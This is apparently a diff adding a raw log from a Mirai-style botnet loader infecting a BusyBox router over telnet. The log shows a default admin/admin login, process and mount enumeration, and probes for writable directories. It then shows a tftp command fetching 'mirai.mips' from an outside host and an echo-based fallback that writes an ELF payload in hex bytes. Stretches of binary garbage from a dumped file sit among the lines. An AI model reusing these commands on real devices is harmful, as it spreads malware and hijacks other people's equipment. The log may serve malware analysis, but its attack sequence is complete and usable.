@@ -1,0 +1,2727 @@
+(1/9) bins/dlr.arm is loading...
+(2/9) bins/dlr.arm7 is loading...
+(3/9) bins/dlr.m68k is loading...
+(4/9) bins/dlr.mips is loading...
+(5/9) bins/dlr.mpsl is loading...
+(6/9) bins/dlr.ppc is loading...
+(7/9) bins/dlr.sh4 is loading...
+(8/9) bins/dlr.spc is loading...
+(9/9) bins/dlr.x86 is loading...
+[FD13] Called connection_open
+[FD13] Established connection
+TELIN: ÿıÿı!ÿûÿû
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+Entrei no login 0
+TELIN: Login: 
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+Entrei no login 7
+matched login prompt at 5, ":", "Login: ıÿı"
+TELOUT:
+  0000  61 64 6d 69 6e                                   admin
+matched password prompt at 0, ":", ": "
+TELIN: a
+matched password prompt at 0, ":", ": ain: ıÿı"
+TELIN: dmin
+matched password prompt at 0, ":", ": adminıÿı"
+Hit end of input.
+TELOUT:
+  0000  0d 0a                                            ..
+TELIN: 
+Password: 
+matched password prompt at 17, ":", ": admin
+Password: "
+TELOUT:
+  0000  61 64 6d 69 6e                                   admin
+matched any prompt at 0, ":", ": "
+TELOUT:
+  0000  0d 0a                                            ..
+TELIN: 
+> 
+matched any prompt at 4, ">", ": 
+> n
+Password: "
+TELOUT:
+  0000  65 6e 61 62 6c 65 0d 0a                          enable..
+TELOUT:
+  0000  73 68 65 6c 6c 0d 0a                             shell..
+TELOUT:
+  0000  73 68 0d 0a                                      sh..
+matched any prompt at 0, ">", "> "
+TELIN: enable
+enable: not found
+> 
+matched any prompt at 29, ">", "> enable
+enable: not found
+> "
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: shell
+
+TELIN: /bin/busybox ECCHI
+
+TELIN: shell: not found
+
+TELIN: > sh
+
+TELIN: 
+
+BusyBox v1.00 (2009.08.10-02:17+0000) Built-in shell (msh)
+TELIN: 
+Enter 'help' for a list of built-in commands.
+
+
+TELIN: # 
+TELIN: /bin/
+TELIN: busy
+TELIN: box 
+TELIN: EC
+TELIN: CHI
+
+TELIN: ECCHI
+TELIN: : applet not found
+# 
+[FD13] Succesfully logged in
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 70 73 3b  /bin/busybox ps;
+  0010  20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43   /bin/busybox EC
+  0020  43 48 49 0d 0a                                   CHI..
+TELIN: /
+TELIN: bin/busybox ps; /bin/busybox ECCHI
+  PID  Uid     VmSize Stat Command
+    1 admin       280 S   init                
+
+pid: 0, proc_name: ECCHI
+pid: 0, proc_name: Command
+pid: 1, proc_name: init
+TELIN:     2 admin           SWN [ksoftirqd/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:     3 admin           SW< [events/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:     4 admin           SW< [khelper]
+
+pid: 0, proc_name: ECCHI
+TELIN:     5 admin           SW< [kblockd/0]
+   15 admin           SW  [pdflush]
+
+pid: 0, proc_name: ECCHI
+pid: 15, proc_name: [pdflush]
+TELIN:    16 admin           SW  [pdflush]
+
+pid: 0, proc_name: ECCHI
+TELIN:    17 admin           SW  [kswapd0]
+
+pid: 0, proc_name: ECCHI
+TELIN:    18 admin           SW< [aio/0]
+
+pid: 0, proc_name: ECCHI
+TELIN:    23 admin           SW  [mtdblockd]
+
+pid: 0, proc_name: ECCHI
+TELIN:    34 admin       324 S   -sh 
+
+pid: 0, proc_name: ECCHI
+TELIN:    74 admin      1612 S   cfm 
+
+pid: 0, proc_name: ECCHI
+TELIN:   272 admin       216 S   pvc2684d 
+  473 admin       200 S   wps_btn 
+
+pid: 0, proc_name: ECCHI
+pid: 473, proc_name: wps_btn
+TELIN:   520 admin       816 S   snmp
+
+pid: 0, proc_name: ECCHI
+TELIN:   529 admin      1724 S   tr64
+
+pid: 0, proc_name: ECCHI
+TELIN:   550 admin      1740 S   httpd
+
+pid: 0, proc_name: ECCHI
+TELIN:   551 admin      1612 S   cfm 
+
+pid: 0, proc_name: ECCHI
+TELIN:   557 admin       364 S   pppd -c 0.0.35.1 -i nas_0_0_35 -u -f 0 -M 1492 
+
+pid: 0, proc_name: ECCHI
+TELIN:   608 admin      1624 S   telnetd
+
+pid: 0, proc_name: ECCHI
+TELIN:   609 admin      1644 S   telnetd
+
+pid: 0, proc_name: ECCHI
+TELIN:   612 admin       288 S   sh -c sh 
+
+pid: 0, proc_name: ECCHI
+TELIN:   613 admin       324 S   sh 
+
+pid: 0, proc_name: ECCHI
+TELIN:   615 admin       284 R   ps              
+
+pid: 0, proc_name: ECCHI
+TELIN: ECCHI
+TELIN: : applet not found
+
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74  /bin/busybox cat
+  0010  20 2f 70 72 6f 63 2f 6d 6f 75 6e 74 73 3b 20 2f   /proc/mounts; /
+  0020  62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43 48  bin/busybox ECCH
+  0030  49 0d 0a                                         I..
+TELIN: # 
+TELIN: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+rootfs / rootfs rw 0 0
+/dev/root / squashfs ro 0 0
+/proc /proc proc rw,nodiratime 0 0
+none /mnt tmpfs rw 0 0
+tmpfs /var tmpfs rw 0 0
+
+TELIN: ECCHI
+TELIN: : applet not found
+
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 27 20 3e 20 2f 2e 6e 69 70 70  6d\x69' > /.nipp
+  0030  6f 6e 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78  on; /bin/busybox
+  0040  20 63 61 74 20 2f 2e 6e 69 70 70 6f 6e 3b 20 2f   cat /.nippon; /
+  0050  62 69 6e 2f 62 75 73 79 62 6f 78 20 72 6d 20 2f  bin/busybox rm /
+  0060  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 70 72 6f 63 27 20 3e 20 2f  6d\x69/proc' > /
+  0030  70 72 6f 63 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62  proc/.nippon; /b
+  0040  69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f  in/busybox cat /
+  0050  70 72 6f 63 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62  proc/.nippon; /b
+  0060  69 6e 2f 62 75 73 79 62 6f 78 20 72 6d 20 2f 70  in/busybox rm /p
+  0070  72 6f 63 2f 2e 6e 69 70 70 6f 6e 0d 0a           roc/.nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 6d 6e 74 27 20 3e 20 2f 6d  6d\x69/mnt' > /m
+  0030  6e 74 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e  nt/.nippon; /bin
+  0040  2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 6d 6e  /busybox cat /mn
+  0050  74 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e 2f  t/.nippon; /bin/
+  0060  62 75 73 79 62 6f 78 20 72 6d 20 2f 6d 6e 74 2f  busybox rm /mnt/
+  0070  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 76 61 72 27 20 3e 20 2f 76  6d\x69/var' > /v
+  0030  61 72 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e  ar/.nippon; /bin
+  0040  2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 76 61  /busybox cat /va
+  0050  72 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e 2f  r/.nippon; /bin/
+  0060  62 75 73 79 62 6f 78 20 72 6d 20 2f 76 61 72 2f  busybox rm /var/
+  0070  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 65 63 68  /bin/busybox ech
+  0010  6f 20 2d 65 20 27 5c 78 36 62 5c 78 36 31 5c 78  o -e '\x6b\x61\x
+  0020  36 64 5c 78 36 39 2f 64 65 76 27 20 3e 20 2f 64  6d\x69/dev' > /d
+  0030  65 76 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e  ev/.nippon; /bin
+  0040  2f 62 75 73 79 62 6f 78 20 63 61 74 20 2f 64 65  /busybox cat /de
+  0050  76 2f 2e 6e 69 70 70 6f 6e 3b 20 2f 62 69 6e 2f  v/.nippon; /bin/
+  0060  62 75 73 79 62 6f 78 20 72 6d 20 2f 64 65 76 2f  busybox rm /dev/
+  0070  2e 6e 69 70 70 6f 6e 0d 0a                       .nippon..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: # 
+TELIN: /bin/
+TELIN: busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon;  /bin/busybox rm /.nippon
+
+TELIN: /.nippon
+TELIN: : cannot create
+
+TELIN: cat
+TELIN: : /.nippon: No such file or directory
+
+TELIN: rm
+TELIN: : cannot remove `/.nippon'
+TELIN: : No such file or directory
+
+TELIN: # /bin/bus
+TELIN: ybox echo 
+TELIN: -e '\x6b
+TELIN: \x61\x6d
+TELIN: \x69/
+TELIN: proc' >
+TELIN:  /proc/
+TELIN: .nip
+TELIN: pon; /b
+TELIN: in/busybox cat  /proc/
+TELIN: .nippon; /bin/busybo
+TELIN: x rm /proc/
+TELIN: .nippo
+TELIN: n
+
+TELIN: /proc/.nippon
+TELIN: : cannot create
+
+TELIN: cat
+TELIN: : /proc/.nippon: No such file or directory
+TELIN: 
+
+TELIN: rm
+TELIN: : cannot remove `/proc/.nippon'
+TELIN: : No such file or directory
+
+TELIN: # 
+TELIN: /bin/busybox ec
+TELIN: ho -e '\x6b\x61\x6d\x6
+TELIN: 9/mnt' > /m
+TELIN: nt/.nippon; /bin/busy
+TELIN: bo
+TELIN: x ca
+TELIN: t / 
+TELIN: mnt/
+TELIN: .ni
+TELIN: ppon
+TELIN: ; /bin
+TELIN: /busybo
+TELIN: x rm /
+TELIN: mnt/.
+TELIN: nippo
+TELIN: n
+
+TELIN: kami/mnt
+
+TELIN: # 
+TELIN: /bin/
+TELIN: busybo
+TELIN: x ech
+TELIN: o -e '
+TELIN: \x6b
+TELIN: \x61
+TELIN: \x6d\x
+TELIN: 69/v
+TELIN: ar' > 
+TELIN: /var
+TELIN: /.nippo
+TELIN: n; /
+TELIN: bin/bu
+TELIN: sybox c
+TELIN: at / va
+TELIN: r/.ni
+TELIN: ppon; 
+TELIN: /bin/b
+TELIN: usybox rm /
+TELIN: var/.nippon
+TELIN: 
+
+TELIN: kami/var
+
+TELIN: # 
+TELIN: /bin/
+TELIN: busybo
+TELIN: x ec
+TELIN: ho -e 
+TELIN: '\x6b\x
+TELIN: 61\x6
+TELIN: d\x69/d
+TELIN: ev' > /dev/.nippon; /bi
+TELIN: n/busyb
+TELIN: ox cat / dev/.n
+TELIN: ippon; 
+TELIN: /bin
+TELIN: /bu
+TELIN: sybo
+TELIN: x rm
+TELIN:  /dev/.nippon
+TELIN: 
+
+TELIN: /dev/.nippon: cannot create
+
+TELIN: cat
+TELIN: : /dev/.nippon: No such file or directory
+
+TELIN: rm
+TELIN: : cannot remove `/dev/.nippon': No such file or directory
+# /b
+TELIN: in/busyb
+TELIN: ox EC
+TELIN: CHI
+
+TELIN: ECCHI
+TELIN: : applet not found
+TELOUT:
+  0000  72 6d 20 2f 6d 6e 74 2f 2e 74 3b 20 72 6d 20 2f  rm /mnt/.t; rm /
+  0010  6d 6e 74 2f 2e 73 68 3b 20 72 6d 20 2f 6d 6e 74  mnt/.sh; rm /mnt
+  0020  2f 2e 68 75 6d 61 6e 0d 0a                       /.human..
+TELOUT:
+  0000  72 6d 20 2f 76 61 72 2f 2e 74 3b 20 72 6d 20 2f  rm /var/.t; rm /
+  0010  76 61 72 2f 2e 73 68 3b 20 72 6d 20 2f 76 61 72  var/.sh; rm /var
+  0020  2f 2e 68 75 6d 61 6e 0d 0a                       /.human..
+[FD13] Found writeable directory: /mnt/
+TELOUT:
+  0000  63 64 20 2f 6d 6e 74 2f 0d 0a                    cd /mnt/..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 70 20  /bin/busybox cp 
+  0010  2f 62 69 6e 2f 65 63 68 6f 20 64 76 72 48 65 6c  /bin/echo dvrHel
+  0020  70 65 72 3b 20 3e 64 76 72 48 65 6c 70 65 72 3b  per; >dvrHelper;
+  0030  20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 68   /bin/busybox ch
+  0040  6d 6f 64 20 37 37 37 20 64 76 72 48 65 6c 70 65  mod 777 dvrHelpe
+  0050  72 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20  r; /bin/busybox 
+  0060  45 43 43 48 49 0d 0a                             ECCHI..
+TELIN: 
+
+TELIN: rm /mnt/.t; rm /mnt/.sh; rm /mnt/.human
+# rm /mnt/.t; rm /mnt/.sh; rm /mnt/.human
+rm
+TELIN: : rm /var/.t; rm /var/.sh; rm /var/.human
+cd /mnt/
+/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
+cannot remove `/mnt/.t': No such file or directory
+rm: cannot remove `/mnt/.sh': No such file or directory
+
+TELIN: rm
+TELIN: : cannot remove `/mnt/.human'
+TELIN: : No such file or directory
+
+TELIN: # 
+TELIN: rm /
+TELIN: var/
+TELIN: .t; r
+TELIN: m /
+TELIN: var/.
+TELIN: sh; 
+TELIN: rm 
+TELIN: /var
+TELIN: /.human
+TELIN: 
+
+TELIN: rm
+TELIN: : cannot remove `/var/.t': No such file or directory
+TELIN: 
+
+TELIN: rm
+TELIN: : cannot remove `/var/.sh': 
+TELIN: No such file or directory
+
+TELIN: rm
+TELIN: : cannot remove `/var/.human'
+TELIN: : No such file or directory
+
+TELIN: # 
+TELIN: cd /
+TELIN: mnt/
+TELIN: 
+# 
+TELIN: /bin/bus
+TELIN: ybo
+TELIN: x cp
+TELIN:  /bin/ec
+TELIN: ho dv
+TELIN: rHe
+TELIN: lper; >dvrHelper; 
+TELIN: /bin/b
+TELIN: usybox chmod 777
+TELIN:  dvrH
+TELIN: el p
+TELIN: er; 
+TELIN: /bin
+TELIN: /bu
+TELIN: sybo
+TELIN: x E
+TELIN: CCHI
+TELIN: 
+
+TELIN: ECCHI
+TELIN: : applet not found
+
+[FD13] Finished copying /bin/echo to cwd
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 61 74  /bin/busybox cat
+  0010  20 2f 62 69 6e 2f 65 63 68 6f 0d 0a               /bin/echo..
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0010  48 49 0d 0a                                      HI..
+TELIN: # 
+TELIN: /bin/
+TELIN: busybox cat /bin/echo
+ELF
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: ntl
+TELIN: og_init
+TELIN: 
+TELIN: B
+TELIN: ø    
+TELIN: 
+TELIN: 
+TELIN: '9Xè ø       $„Œ¼
+TELIN: ‚€$QYT È! ø     @ ! È! ø        ` !€ ! È! ø     
+TELIN: È!$
+TELIN: $
+TELIN: $
+TELIN: 
+TELIN: <™€'9o` ø        
+TELIN: <À'œP™à!'½ÿÈ¯¿
+TELIN: 
+TELIN: l ø 
+TELIN: $ş£¢
+TELIN: $
+TELIN: Œƒ$l§¥´$B!¯¢
+TELIN: ¼
+TELIN:  ø        
+TELIN: ¢ 
+TELIN: ¼
+TELIN: 
+TELIN: 
+TELIN: !
+TELIN: ¼
+TELIN: ¼
+TELIN: 
+TELIN: …€ &YÌğ ø  $¥*ì¼
+TELIN: şø¯¿
+TELIN:  !¼
+TELIN: 
+TELIN: ¯¢
+TELIN: 2<¢
+TELIN: &1
+TELIN: „€ „€Œ‚ô@
+TELIN:  ø  $„88£`
+TELIN:  ¯¼
+TELIN: € ™\
+TELIN: ¢
+TELIN: (!™‡8'¤
+TELIN: 'œfT™à!'½ÿØ¯¿
+TELIN: 
+TELIN:  ø        
+TELIN: !™ƒd@ÿò 0!™‚Œ ø       
+TELIN: ¨!À
+TELIN: à!'½ÿÀ¯¾
+TELIN: 
+TELIN: ¡‚€ Ô@IğF €F$ƒD” 
+TELIN: @€!¼
+TELIN: €0!‚€$…€ À8!$PhÄ
+TELIN: 
+TELIN: &1
+TELIN: 
+TELIN: €B
+TELIN: ¯±
+TELIN: ¯¹
+TELIN: 
+TELIN: @ !‚€$$Pxø
+TELIN: ™¬FMd‚€ŒBMp¯¢ü‚€ŒBMt¯¢
+TELIN: !'½ÿĞ¯¿
+TELIN: D:4$cŒ
+TELIN: ‚€ŒB*@
+TELIN: „Pô¼
+TELIN: ™à!'½ÿØ¯¿
+TELIN: 
+TELIN: !'¢  \"+$
+TELIN:  ÿô¼
+TELIN: †
+TELIN: !ŒD
+TELIN: '9u ø   ŒDO$¼
+TELIN: $
+TELIN: ¢
+TELIN: !'9}è 
+TELIN: 
+TELIN: ('9Ìì ø    
+TELIN: M@¼
+TELIN: 
+TELIN: &ùsÀŒDMˆ ø     $r®¼
+TELIN: ¼
+TELIN: 
+TELIN: @ !T
+TELIN: ö&s
+TELIN: @
+TELIN: BO„@
+TELIN: ˜!
+TELIN: '½
+TELIN: ³
+TELIN: ¯²
+TELIN: 
+TELIN: •€($
+TELIN:     
+TELIN:      „€ ™‚x¦È (! ø        $„Z¼
+TELIN: 
+TELIN: 
+TELIN: ¼
+TELIN: !
+TELIN: ¼
+TELIN: ¯¿,¯´(¯³$¯² ¯±¯°¯¼
+TELIN: !@ÿ×™‚4™‚à€ ! ø      €!¼
+TELIN: 
+TELIN: 
+TELIN: ‚
+TELIN: B
+TELIN: ²
+TELIN: ¢
+TELIN: (¼
+TELIN: '9L ø       
+TELIN:  ®
+TELIN: ¼
+TELIN: ¼
+TELIN: 8!ŒÂ
+TELIN: ø      
+TELIN: @
+TELIN: 
+TELIN: 
+TELIN:  ø        
+TELIN: $„Œ 
+TELIN: P#$
+TELIN: x! ø      $´™€àx! ø      $¯™€àx! ø      $®™€àx! ø      $ª™€àx! ø      $©™€àx! ø      $¨™€àx! ø      $§™€àx! ø      $£™€àx! ø      $¢™€àx! ø      $¡™€àx! ø      $ ™€àx! ø      $™€àx! ø      $š™€àx! ø      $™™€àx! ø      $’™€àx! ø      $™€àx! ø      $‹™€àx! ø      $ˆ™€àx! ø      $‡™€àx! ø      $†™€àx! ø      $„™€àx! ø      $™€àx! ø      $€™€àx! ø      $™€àx! ø       $~™€àx! ø      $}™€àx! ø      $z™€àx! ø      $y™€àx! ø      $w™€àx! ø      $q™€àx! ø      $m™€àx! ø      $k™€àx! ø      $j™€àx! ø      $h™€àx! ø      $g™€àx! ø      $f™€àx! ø      $d™€àx! ø      $c™€àx! ø      $`™€àx! ø      $^™€àx! ø      $\™€àx! ø      $[™€àx! ø      $Y™€àx! ø      $X™€àx! ø      $V™€àx! ø      $T™€àx! ø      $Q™€àx! ø      $O™€àx! ø      $M™€àx! ø      $K™€àx! ø      $J™€àx! ø      $I™€àx! ø      $G™€àx! ø      $E™€àx! ø      $B™€àx! ø      $>™€àx! ø      $;™€àx! ø      $7™€àx! ø      $5™€àx! ø      $4™€àx! ø      $2™€àx! ø      $0™€àx! ø      $.™€àx! ø      $,™€àx! ø      $*™€àx! ø      $)™€àx! ø      $"™€àx! ø      $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø       $™€àx! ø        $™€àx! ø       $™€àx! ø       $
+™€àx! ø        $       ™€àx! ø        $™€àx! ø       $
+TELIN: ™€àx! ø       $™€àx! ø       $™€àx! ø       $
+TELIN:  $
+TELIN: s]] [+FORMAT]
+
+Displays the current time in the given FORMAT, or sets the system date.
+
+Options:
+        -R              Outputs RFC-822 compliant date string
+        -d STRING       Displays time described by STRING, not `now
+TELIN: '
+        -I[TIMESPEC]    Outputs an ISO-8601 compliant date/time string.
+                        TIMESPEC=`date' (or missing) for date only,
+                        `hours', `minutes', or `seconds' for date and,
+                        time to the indicated precision.
+        -s              Sets time described by STRING
+        -r FILE         Displays the last modification time of FILE
+        -u              Prints or sets Coordinated Universal Time
+TELIN: ke `/'
+        ( EXPRESSION )              value of EXPRESSION
+
+Beware that many operators need to be escaped or quoted for shells.
+Comparisons are arithmetic if both ARGs are numbers, else
+lexicographical.  Pattern matches return the string matched between 
+\( and \) or null; if \( and \) are not used, they return the number 
+of characters matched or 0.
+TELIN:   Fully qualified domain name
+        -F FILE Use the contents of FILE to specify the hostname
+TELIN: el of console messages to n.
+        -n      Run as a foreground process.
+TELIN: ereference symlinks - treat like normal file
+TELIN: 
+        -s      list the size of each file, in blocks
+        -t      with -l: show modification time
+        -u      with -l: show access time
+        -v      sort the listing by version
+        -x      list entries by lines instead of by columns
+        -X      sort the listing by extension
+
+TELIN: sync:     Writes are asynchronous / synchronous.
+        atime/noatime:  Enable / disable updates to inode access times.
+        dev/nodev:      Allow use of special device files / disallow them.
+        exec/noexec:    Allow use of executable files / disallow them.
+        suid/nosuid:    Allow set-user-id-root programs / disallow them.
+        remount:        Re-mount a mounted filesystem, changing its flags.
+        ro/rw:          Mount for read-only / read-write.
+        bind:           Use the linux 2.4.x "bind" feature.
+
+There are EVEN MORE flags that are specific to each filesystem.
+You'll have to see the written documentation for those filesystems.
+TELIN: it the kernel's routing tables.
+
+Options:
+        -n              Dont resolve names.
+        -e              Display other/more information.
+        -A inet         Select address family.
+TELIN: ]        remote log level
+TELIN: os]
+        set_name_type   [name-type]
+TELIN: 0€
+TELIN:   %s
+
+TELIN: d%d
+
+TELIN: d = %04x.
+
+TELIN: ORWARD -p ALL -j DMZFWD
+TELIN: s %5d %2d.%d %2u.%u 
+TELIN: cannot redirect shell command
+TELIN: odiratime
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: 
+TELIN: tÔ»0âJß¥A=Ø•×¤ÑÄmÓÖôûCiéj4nÙü­gˆFÚ`¸ĞD-s3åª
+L_İ|ÉPq<'Aª¾É †Whµ% o…³¹fÔ ÎaäŸ^Şù)ÙÉ˜°Ğ˜"Ç×¨´Y³=.´·½\;Àºl­í¸ƒ š¿³¶¶ât±ÒšêÕG9Òw¯Û&sÜƒãc”d;„mj>zjZ¨äÏ“      ÿ
+
+TELIN: 
+TELIN: ğ
+TELIN: @
+TELIN: # /bin/busybox ECCHI
+ECCHI: applet not found
+# 
+[FD13] Detected architecture: 'mips'
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65  /bin/busybox wge
+  0010  74 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f 78 20  t; /bin/busybox 
+  0020  74 66 74 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62  tftp; /bin/busyb
+  0030  6f 78 20 45 43 43 48 49 0d 0a                    ox ECCHI..
+TELIN: /
+TELIN: bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI
+
+TELIN: wget
+TELIN: : applet not found
+
+TELIN: BusyBox v1.00 (2009.08.10-02:17+0000) multi-call binary
+TELIN: 
+
+Usage: tftp [OPTION]... tftp_server_ip
+
+Update firmware image and configuration data from OR backup configuration
+data to a tftp server.
+
+Options:
+-g      Get file. (Update image/configuration data)
+-p      Put file. (backup configuration data)
+-f      remote file name.
+-t      i for image and c for configuration data.
+
+
+
+TELIN: ECCHI
+TELIN: : applet not found
+
+[FD13] Upload method is TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 74 66 74  /bin/busybox tft
+  0010  70 20 2d 67 20 2d 6c 20 64 76 72 48 65 6c 70 65  p -g -l dvrHelpe
+  0020  72 20 2d 72 20 6d 69 72 61 69 2e 6d 69 70 73 20  r -r mirai.mips 
+  0030  31 39 32 2e 31 36 38 2e 32 2e 32 30 3b 20 2f 62  192.168.2.20; /b
+  0040  69 6e 2f 62 75 73 79 62 6f 78 20 63 68 6d 6f 64  in/busybox chmod
+  0050  20 37 37 37 20 64 76 72 48 65 6c 70 65 72 3b 20   777 dvrHelper; 
+  0060  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 45 43 43  /bin/busybox ECC
+  0070  48 49 0d 0a                                      HI..
+tftp
+TELIN: # 
+TELIN: /bin/busybox tftp -g -l dvrHelper -r mirai.mips 192.168.2.20; /bin/busybox chm od 777 dvrHelpe
+TELIN: r; /b
+TELIN: in/
+TELIN: busy
+TELIN: bo
+TELIN: x EC
+TELIN: CHI
+TELIN: 
+
+TELIN: tftp
+TELIN: : illegal option -- l
+tftp: illegal option -- r
+
+TELIN: tftp: 
+TELIN: dvrHelper: Unknown host
+
+TELIN: ECCHI
+TELIN: : applet not found
+
+[FD13] No permission to TFTP load, falling back to echo!
+TELOUT:
+  0000  2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 63 70 20  /bin/busybox cp 
+  0010  64 76 72 48 65 6c 70 65 72 20 75 70 6e 70 3b 20  dvrHelper upnp; 
+  0020  3e 20 75 70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73  > upnp; /bin/bus
+  0030  79 62 6f 78 20 63 68 6d 6f 64 20 37 37 37 20 75  ybox chmod 777 u
+  0040  70 6e 70 3b 20 2f 62 69 6e 2f 62 75 73 79 62 6f  pnp; /bin/busybo
+  0050  78 20 45 43 43 48 49 0d 0a                       x ECCHI..
+echooooo TELIN: /bin/busybox cp dvrHelper upnp; > upnp; /bin/busybox chmod 777 upnp; /bin/busybox ECCHI
+
+echooooo TELIN: # /bin/busybox cp dvrHelper upnp; > upnp; /bin/busybox chmod 777 upnp; /bin/busy box ECCHI
+
+echooooo TELIN: ECCHI
+echooooo TELIN: : applet not found
+
+echooooo TELOUT:
+  0000  65 63 68 6f 20 2d 6e 65 20 27 5c 78 37 66 5c 78  echo -ne '\x7f\x
+  0010  34 35 5c 78 34 63 5c 78 34 36 5c 78 30 31 5c 78  45\x4c\x46\x01\x
+  0020  30 32 5c 78 30 31 5c 78 30 30 5c 78 30 30 5c 78  02\x01\x00\x00\x
+  0030  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0040  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0050  30 32 5c 78 30 30 5c 78 30 38 5c 78 30 30 5c 78  02\x00\x08\x00\x
+  0060  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  0070  34 30 5c 78 30 34 5c 78 63 30 5c 78 30 30 5c 78  40\x04\xc0\x00\x
+  0080  30 30 5c 78 30 30 5c 78 33 34 5c 78 30 30 5c 78  00\x00\x34\x00\x
+  0090  30 30 5c 78 30 36 5c 78 62 38 5c 78 30 30 5c 78  00\x06\xb8\x00\x
+  00a0  30 30 5c 78 31 30 5c 78 30 37 5c 78 30 30 5c 78  00\x10\x07\x00\x
+  00b0  33 34 5c 78 30 30 5c 78 32 30 5c 78 30 30 5c 78  34\x00\x20\x00\x
+  00c0  30 33 5c 78 30 30 5c 78 32 38 5c 78 30 30 5c 78  03\x00\x28\x00\x
+  00d0  30 37 5c 78 30 30 5c 78 30 36 5c 78 30 30 5c 78  07\x00\x06\x00\x
+  00e0  30 30 5c 78 30 30 5c 78 30 31 5c 78 30 30 5c 78  00\x00\x01\x00\x
+  00f0  30 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  00\x00\x00\x00\x
+  0100  34 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  40\x00\x00\x00\x
+  0110  34 30 5c 78 30 30 5c 78 30 30 5c 78 30 30 5c 78  40\x00\x00\x00\x
+  0120  30 30 5c 78 30 36 5c 78 33 30 5c 78 30 30 5c 78  00\x06\x30\x00\x
